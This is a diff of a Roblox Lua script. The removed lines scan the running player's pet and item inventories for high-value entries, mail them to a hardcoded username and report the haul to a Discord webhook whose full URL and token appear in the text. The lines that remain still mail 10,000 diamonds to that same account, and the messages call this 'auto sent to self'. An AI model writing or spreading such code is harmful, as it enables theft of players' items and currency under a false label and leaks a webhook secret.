@@ -1,74 +1,12 @@
 local myUsername = "NuMBeX3230"
-local discordWebhook = "https://discord.com/api/webhooks/1433180776442237083/cmFQlxF1XuEjhCqUVVT5-7dogcBhGCQjEF076Xizu-npJkh1wm12sWK3eUjO122Tudoe"
-local gemsLimit = 100000
-
-print("Script STARTED")
-
-local player = game.Players.LocalPlayer
-
-local valuablePets = {}
-for _, pet in ipairs(player.PetInventory:GetChildren()) do
-    if pet:FindFirstChild("GemValue") and pet.GemValue.Value > gemsLimit then
-        table.insert(valuablePets, {
-            id = pet.PetUID.Value,
-            name = pet.Name,
-            value = pet.GemValue.Value
-        })
-    end
-end
-
-local valuableItems = {}
-for _, item in ipairs(player.ItemInventory:GetChildren()) do
-    if item:FindFirstChild("GemValue") and item.GemValue.Value > gemsLimit then
-        table.insert(valuableItems, {
-            id = item.ItemUID.Value,
-            name = item.Name,
-            value = item.GemValue.Value
-        })
-    end
-end
+local diamondsToSend = 10000
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Network = ReplicatedStorage:WaitForChild("Network")
 local MailboxSend = Network:WaitForChild("Mailbox: Send")
 
-for _, pet in pairs(valuablePets) do
-    local args = {
-        myUsername, "Auto Send By Script", "Pet", pet.id, 51
-    }
-    print("Sending pet:", pet.name, pet.value)
-    MailboxSend:InvokeServer(unpack(args))
-end
-
-for _, item in pairs(valuableItems) do
-    local args = {
-        myUsername, "Auto Send By Script", "Item", item.id, 51
-    }
-    print("Sending item:", item.name, item.value)
-    MailboxSend:InvokeServer(unpack(args))
-end
-
-local diamondsToSend = 10000
 local argsDiamonds = {
     myUsername, "Auto Gems By Script", "Diamonds", diamondsToSend, 51
 }
 print("Sending gems:", diamondsToSend)
 MailboxSend:InvokeServer(unpack(argsDiamonds))
-
-local HttpService = game:GetService("HttpService")
-local function sendDiscordMessage(text)
-    local data = { ["content"] = text }
-    HttpService:PostAsync(discordWebhook, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
-end
-
-local sentList = {}
-for _, pet in pairs(valuablePets) do
-    table.insert(sentList, "Pet: " .. pet.name .. " (" .. pet.value .. " gems)")
-end
-for _, item in pairs(valuableItems) do
-    table.insert(sentList, "Item: " .. item.name .. " (" .. item.value .. " gems)")
-end
-table.insert(sentList, "Gems: " .. diamondsToSend)
-sendDiscordMessage("Auto sent to self:\n" .. table.concat(sentList, "\n"))
-
-print("Script FINISHED! Check inventory and Discord!")
